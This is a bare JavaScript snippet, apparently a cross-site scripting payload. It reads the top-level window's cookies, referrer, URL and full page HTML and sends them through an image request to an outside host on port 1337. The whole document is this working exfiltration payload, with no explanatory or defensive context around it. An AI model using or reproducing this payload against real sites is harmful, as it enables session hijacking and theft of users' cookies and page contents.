d=window.top.document;
w=window.top;
(new Image()).src=`http://terjanq.cf:1337/?${d.cookie}&ref=${d.referrer}&url=${encodeURIComponent(w.location.href)}&body=${encodeURIComponent(d.documentElement.innerHTML)}`;
